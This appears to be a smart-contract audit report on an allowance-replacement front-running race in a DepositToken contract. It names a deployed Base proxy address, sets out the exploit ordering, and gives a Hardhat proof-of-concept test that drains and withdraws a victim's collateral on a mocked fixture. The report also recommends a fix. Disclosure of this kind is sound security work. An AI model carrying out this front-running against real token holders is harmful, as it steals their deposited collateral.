### Title

DepositToken allowance replacement race drains unlocked collateral - (File: contracts/DepositToken.sol)

### Summary

`DepositToken.approve()` directly overwrites an existing finite allowance, while `DepositToken.transferFrom()` spends the allowance current at execution time. An unprivileged spender can therefore front-run a victim’s allowance-change transaction to spend the old allowance, then spend the newly approved allowance after the victim’s transaction executes. If the victim has enough unlocked `msdTOKEN`, the attacker receives `oldAllowance + newAllowance` and can withdraw the corresponding underlying collateral. [1](#0-0) [2](#0-1) 

### Finding Description

`approve(spender_, amount_)` assigns `allowance[_msgSender()][spender_] = amount_` without requiring the prior allowance to be zero. [1](#0-0) [3](#0-2) 

`transferFrom(sender_, recipient_, amount_)` checks that `sender_` has enough unlocked deposit-token balance, deducts a finite allowance, and transfers the tokens to `recipient_`. [2](#0-1) 

The exploitable ordering is:

1. `allowance[victim][attacker] = 100`.
2. Victim broadcasts `approve(attacker, 50)`.
3. Attacker front-runs it with `transferFrom(victim, attacker, 100)`.
4. Victim’s transaction executes and restores `allowance[victim][attacker]` to `50`.
5. Attacker calls `transferFrom(victim, attacker, 50)`.

The attacker receives 150 deposit tokens even though the victim intended the final allowance to be only 50. [4](#0-3) 

Deposit tokens are economically meaningful collateral receipts: a recipient with no debt has the full transferred balance unlocked, and `withdraw()` burns those tokens and causes `Treasury.pull()` to send underlying collateral to the attacker-selected recipient. [5](#0-4) [6](#0-5) [7](#0-6) 

This affects production deposit-token proxies, including the deployed Base `USDCDepositToken_Pool1` proxy at `0xC7F2f79Daa7Ea4FBbF60b45b5D6028BDE2453476`. [8](#0-7) 

### Impact Explanation

The attacker can directly steal unlocked deposit-token balances and redeem them for underlying collateral. For example, a victim with 150 unlocked `msdMET`, an existing 100-token allowance, and a pending 50-token replacement approval loses all 150 `msdMET`; the attacker can withdraw them for the underlying MET collateral. [9](#0-8) [10](#0-9) 

The broken invariant is allowance conservation: one intended final allowance can authorize both the pre-change and post-change amounts. [11](#0-10) [12](#0-11) 

### Likelihood Explanation

Exploitation requires the victim to have previously granted the attacker a finite nonzero allowance and later submit a transaction replacing it with another nonzero amount. The attacker only needs normal public-transaction ordering or private-ordering access; no privileged role, oracle manipulation, malicious endpoint, reentrancy, or contract-specific precondition is required. [11](#0-10) [2](#0-1) 

The `_revertIfLocked` check limits theft to the victim’s unlocked collateral, but a user without debt has the entire deposit-token balance unlocked. [9](#0-8) [5](#0-4) 

### Recommendation

Prevent nonzero-to-nonzero allowance replacement in `DepositToken.approve()`, such as by requiring `amount_ == 0 || allowance[owner][spender] == 0`, or replace `approve()` with permit/signed-intent flows that atomically encode the expected previous allowance. Users should continue using `increaseAllowance()` and `decreaseAllowance()`, which already update the allowance atomically. [13](#0-12) [14](#0-13) 

### Proof of Concept

The following test fits the existing `DepositToken` test fixture, which deploys a mocked underlying token, `Pool`, `Treasury`, `FeeProvider`, and `DepositToken`. [15](#0-14) 

```ts
// test/DepositToken.test.ts

it('spends old and new allowances when approve is front-run', async function () {
  const depositedAmount = parseEther('150')
  const oldAllowance = parseEther('100')
  const newAllowance = parseEther('50')

  // Alice deposits underlying collateral and receives 150 msdMET.
  await met.connect(alice).approve(metDepositToken.address, depositedAmount)
  await metDepositToken.connect(alice).deposit(depositedAmount, alice.address)

  // Alice had previously approved Bob for 100 msdMET.
  await metDepositToken.connect(alice).approve(bob.address, oldAllowance)

  // Bob sees Alice broadcast approve(bob, 50) and front-runs it.
  await metDepositToken
    .connect(bob)
    .transferFrom(alice.address, bob.address, oldAllowance)

  // Alice's allowance replacement then executes.
  await metDepositToken.connect(alice).approve(bob.address, newAllowance)

  // Bob spends the new allowance too.
  await metDepositToken
    .connect(bob)
    .transferFrom(alice.address, bob.address, newAllowance)

  expect(await metDepositToken.balanceOf(alice.address)).eq(0)
  expect(await metDepositToken.balanceOf(bob.address)).eq(depositedAmount)

  // Bob has no debt, so the transferred receipt balance is fully unlocked.
  poolMock.debtPositionOf.whenCalledWith(bob.address).returns(
    debtPositionOf_returnsAllUnlocked(depositedAmount)
  )

  const underlyingBefore = await met.balanceOf(bob.address)

  // Bob redeems the stolen receipt balance for underlying collateral.
  await metDepositToken.connect(bob).withdraw(depositedAmount, bob.address)

  expect(await met.balanceOf(bob.address)).eq(underlyingBefore.add(depositedAmount))
})
```

### Citations

**File:** contracts/DepositToken.sol (L177-182)
```text
    /**
     * @notice Requires that amount is lower than the account's unlocked balance
     */
    function _revertIfLocked(address account_, uint256 amount_) private view {
        if (unlockedBalanceOf(account_) < amount_) revert NotEnoughFreeBalance();
    }
```

**File:** contracts/DepositToken.sol (L184-190)
```text
    /**
     * @notice Set `amount` as the allowance of `spender` over the caller's tokens
     */
    function approve(address spender_, uint256 amount_) external override returns (bool) {
        _approve(_msgSender(), spender_, amount_);
        return true;
    }
```

**File:** contracts/DepositToken.sol (L193-203)
```text
     * @notice Atomically decrease the allowance granted to `spender` by the caller
     */
    function decreaseAllowance(address spender_, uint256 subtractedValue_) external returns (bool) {
        address _msgSender = _msgSender();
        uint256 _currentAllowance = allowance[_msgSender][spender_];
        if (_currentAllowance < subtractedValue_) revert DecreasedAllowanceBelowZero();
        unchecked {
            _approve(_msgSender, spender_, _currentAllowance - subtractedValue_);
        }
        return true;
    }
```

**File:** contracts/DepositToken.sol (L253-259)
```text
     * @notice Atomically increase the allowance granted to `spender` by the caller
     */
    function increaseAllowance(address spender_, uint256 addedValue_) external returns (bool) {
        address _msgSender = _msgSender();
        _approve(_msgSender, spender_, allowance[_msgSender][spender_] + addedValue_);
        return true;
    }
```

**File:** contracts/DepositToken.sol (L357-374)
```text
    function transferFrom(
        address sender_,
        address recipient_,
        uint256 amount_
    ) external override nonReentrant returns (bool) {
        _revertIfLocked(sender_, amount_);

        address _msgSender = _msgSender();
        uint256 _currentAllowance = allowance[sender_][_msgSender];
        if (_currentAllowance != type(uint256).max) {
            if (_currentAllowance < amount_) revert AmountExceedsAllowance();
            unchecked {
                _approve(sender_, _msgSender, _currentAllowance - amount_);
            }
        }

        _transfer(sender_, recipient_, amount_);

```

**File:** contracts/DepositToken.sol (L383-397)
```text
    function unlockedBalanceOf(address account_) public view override returns (uint256 _unlockedBalance) {
        IPool _pool = pool;

        (, , uint256 _debtInUsd, , uint256 _issuableInUsd) = _pool.debtPositionOf(account_);

        if (_debtInUsd == 0) {
            return balanceOf[account_];
        }

        if (_issuableInUsd > 0) {
            _unlockedBalance = Math.min(
                balanceOf[account_],
                _pool.masterOracle().quoteUsdToToken(address(underlying), _issuableInUsd.wadDiv(collateralFactor))
            );
        }
```

**File:** contracts/DepositToken.sol (L430-438)
```text
     * @notice Set `amount` as the allowance of `spender` over the caller's tokens
     */
    function _approve(address owner_, address spender_, uint256 amount_) private {
        if (owner_ == address(0)) revert ApproveFromTheZeroAddress();
        if (spender_ == address(0)) revert ApproveToTheZeroAddress();

        allowance[owner_][spender_] = amount_;
        emit Approval(owner_, spender_, amount_);
    }
```

**File:** contracts/DepositToken.sol (L536-553)
```text
    function _withdraw(
        address account_,
        uint256 amount_,
        address to_
    ) private whenNotShutdown nonReentrant onlyIfDepositTokenExists returns (uint256 _withdrawn, uint256 _fee) {
        if (amount_ == 0) revert AmountIsZero();

        IPool _pool = pool;

        (_withdrawn, _fee) = quoteWithdrawOut(amount_);
        if (_fee > 0) {
            _transfer(account_, _pool.feeCollector(), _fee);
        }

        _burn(account_, _withdrawn);
        _pool.treasury().pull(to_, _withdrawn);

        emit CollateralWithdrawn(account_, to_, amount_, _withdrawn, _fee);
```

**File:** contracts/Treasury.sol (L66-72)
```text
    function pull(address to_, uint256 amount_) external override nonReentrant {
        address _msgSender = _msgSender();
        if (!pool.doesDepositTokenExist(IDepositToken(_msgSender))) revert SenderIsNotDepositToken();
        if (to_ == address(0)) revert RecipientIsNull();
        if (amount_ == 0) revert AmountIsZero();
        IDepositToken(_msgSender).underlying().safeTransfer(to_, amount_);
    }
```

**File:** deployments/base/USDCDepositToken_Pool1_Proxy.json (L1-3)
```json
{
  "address": "0xC7F2f79Daa7Ea4FBbF60b45b5D6028BDE2453476",
  "abi": [
```

**File:** test/DepositToken.test.ts (L43-115)
```typescript
  beforeEach(async function () {
    // eslint-disable-next-line @typescript-eslint/no-extra-semi
    ;[deployer, governor, alice, bob, feeCollector] = await ethers.getSigners()

    const masterOracleMock = await ethers.getContractFactory('MasterOracleMock', deployer)
    masterOracle = <MasterOracleMock>await masterOracleMock.deploy()
    await masterOracle.deployed()

    const metMockFactory = await ethers.getContractFactory('ERC20Mock', deployer)
    met = await metMockFactory.deploy('Metronome', 'MET', 18)
    await met.deployed()
    await met.mint(alice.address, parseEther('1000'))

    const treasuryFactory = await ethers.getContractFactory('Treasury', deployer)
    treasury = await treasuryFactory.deploy()
    await treasury.deployed()
    await setStorageAt(treasury.address, 0, 0) // Undo initialization made by constructor

    const esMET = await smock.fake('IESMET')

    const poolRegistryMock = await smock.fake<PoolRegistry>('PoolRegistry')
    await setBalance(poolRegistryMock.address, parseEther('1')) // Workaround "function call to a non-contract account" error
    poolRegistryMock.governor.returns(governor.address)
    poolRegistryMock.operator.returns(ethers.constants.AddressZero)

    const feeProviderFactory = await ethers.getContractFactory('FeeProvider', deployer)
    feeProvider = await feeProviderFactory.deploy()
    await feeProvider.deployed()
    await setStorageAt(feeProvider.address, 0, 0) // Undo initialization made by constructor
    await feeProvider.initialize(poolRegistryMock.address, esMET.address)

    const depositTokenFactory = await ethers.getContractFactory('DepositToken', deployer)
    metDepositToken = await depositTokenFactory.deploy()
    await metDepositToken.deployed()
    await setStorageAt(metDepositToken.address, 0, 0) // Undo initialization made by constructor

    smartFarmingManagerMock = await smock.fake<SmartFarmingManager>('SmartFarmingManager')
    await setBalance(smartFarmingManagerMock.address, parseEther('10'))

    poolMock = await smock.fake<Pool>('contracts/Pool.sol:Pool')
    await setBalance(poolMock.address, parseEther('10'))
    poolMock.masterOracle.returns(masterOracle.address)
    poolMock.governor.returns(governor.address)
    poolMock.feeCollector.returns(feeCollector.address)
    poolMock.paused.returns(false)
    poolMock.everythingStopped.returns(false)
    poolMock.doesDepositTokenExist.returns(true)
    poolMock.treasury.returns(treasury.address)
    poolMock.feeProvider.returns(feeProvider.address)
    poolMock.smartFarmingManager.returns(smartFarmingManagerMock.address)
    poolMock.poolRegistry.returns(poolRegistryMock.address)

    smartFarmingManagerMock.pool.returns(poolMock.address)

    const rewardsDistributorMockFactory = await smock.mock('RewardsDistributor')
    rewardsDistributorMock = await rewardsDistributorMockFactory.deploy()
    poolMock.getRewardsDistributors.returns([rewardsDistributorMock.address])
    rewardsDistributorMock.pool.returns(poolMock.address)

    await metDepositToken.initialize(
      met.address,
      poolMock.address,
      'Metronome Synth MET-Deposit',
      'msdMET',
      18,
      metCF,
      MaxUint256
    )
    metDepositToken = metDepositToken.connect(governor)

    await masterOracle.updatePrice(met.address, metPrice)
    await treasury.initialize(poolMock.address)
  })
```
